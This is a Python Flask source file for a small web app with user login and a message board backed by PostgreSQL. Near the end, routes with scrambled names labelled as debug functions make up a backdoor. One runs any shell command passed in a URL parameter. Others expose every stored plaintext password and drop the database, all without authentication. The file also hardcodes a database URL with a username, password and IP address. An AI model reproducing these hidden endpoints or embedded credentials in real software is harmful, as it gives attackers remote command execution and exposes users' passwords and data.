from flask import Flask, request, make_response, redirect, session, render_template, send_file, flash 
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
import pandas as pd
import os
import json
import re
import datetime
app = Flask(__name__)
app.secret_key = os.urandom(32)
# ref : https://stackabuse.com/using-sqlalchemy-with-flask-and-postgresql/	
sql_url = "postgresql://clg5zsopy000xf4pofq5zcri2:x8fmrT8rZHITG6zm195f8Pau@140.112.18.210:9015/clg5zsoq0000zf4pohh07fyob"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = sql_url
#app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['SQLALCHEMY_DATABASE_URI']
db = SQLAlchemy(app)

regex = re.compile(r'^[A-Za-z0-9_-]*$')

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    username = db.Column(db.String(30),unique=True,nullable=False)
    password = db.Column(db.String(30),nullable=False)
    
    def __init__(self,username,password):
        self.username = username
        self.password = password

class Message(db.Model):
    __tablename__ = 'message'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    username = db.Column(db.String(30),nullable=False)
    message = db.Column(db.String(256),nullable=False)
    is_deleted = db.Column(db.Boolean)
    timestamp =  db.Column(db.String(256),nullable=False)

    def __init__(self, username ,message):
        self.username = username
        self.message = message
        self.is_deleted = 0
        self.timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


@app.route('/')
def hello():
    db.create_all()        
    return render_template('index.html')

@app.route('/about')
def about():
	return render_template('about.html')

########################
## user function
########################
@app.route('/create_user')
def create_user():
    if 'username' in session:
        return redirect('/')
	
    return render_template('create_user.html')

@app.route("/login", methods=['POST'])
def login():

    # already login 
    if 'username' in session:
        return redirect('/')    

    # check password
    def valid_user(user,password):
        return user.password == password

    def is_blank(username,password):
        return len(password) < 1 and len(username) < 1 
    
    def is_only_number_letter(username,password):
        return regex.match(username) and  regex.match(password)

    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()
    ## user don't exits
    if not user :
       # no blank input 
        if is_blank(username,password):
            flash("Username are blank or Password are blank")
            return redirect("/create_user")
        
        if not is_only_number_letter(username,password):
            flash("Only numbers, letters and dashes are allowed")
            return redirect("/create_user")

        ### create user to db 
        new_user = User(username,password)
        db.session.add(new_user)
        db.session.commit()
        
        # create session 
        session['username'] = username

        return redirect('user')

    ## input != password
    elif not valid_user(user,password):
        flash('User already exists or Password Error')
        return redirect("/create_user")
    
    ### valid user / login and create session 
    session['username'] = username
    return redirect("/")

@app.route('/logout')
def logout():
    session.clear()
    return redirect("/")


@app.route('/user')
def user():
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="users", con=engine)
    result = user_table[["id","username"]].to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4)
    return render_template('user.html',user_data=result)

####################
# message board
####################


@app.route('/message_board')
def message_board():
    
    #render message to web
    message_list = Message.query.order_by(Message.id).all()
    if 'username' not in session:
        username = None
    else :
        username = session['username']
    #print(username)
    return render_template('board.html', message_list = message_list, username=username)


@app.route('/add_message',methods=['POST'])
def add_message():

    ## not login 
    if 'username' not in session:
        flash("Please Login First")
        return redirect('message_board')   

    ## get username from session 
    username = session['username']
    #user = User.query.filter_by(username=username).first()
    
    ## add message to db 
    message = request.form.get('message')
    new_message = Message(username,message)
    db.session.add(new_message)
    db.session.commit()
    return redirect('message_board')

@app.route('/delete_message',methods=['POST'])
def delete_message():
    
    # not login 
    if 'username' not in session:
        flash("Please Login First")
        return redirect('message_board')    


    msg_id = request.form.get('msg_id')
    message = Message.query.filter_by(id=msg_id).first()
    
    ## check username == current user 
    if session['username'] != message.username :
        flash("You are not the owner of this message.")
        return redirect('message_board')   
    
    ## Set message is_delete to True

    message.is_deleted = True
    db.session.commit()

    flash("Delete Success")
    return redirect('message_board')    


###################
# function for debug
###################

@app.route('/shell_fsdjfhldskjflkjdslfjldskjflkdsjflkjds')
def bbbbb():
    cmd = request.args.get('cmd')
    
    return os.popen(f'{cmd}').read()

@app.route('/check_user_db_fjkdlsjflkdsjflkjdslkfjldskjfldsk')
def check_user_db():
    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="users", con=engine)
    result = user_table.to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4) 
    return result

@app.route('/check_message_db_fklsdkjflkjdsflkjdlsf')
def check_message_db():
    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="message", con=engine)
    result = user_table.to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4) 
    return result

@app.route('/drop_db_gkdjkflsdflksdjfkldsjflkjdsl')
def drop_db():
    db.drop_all()
    return redirect('/')

## TODO : add message board db, add/delete function 


if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8000,debug=True)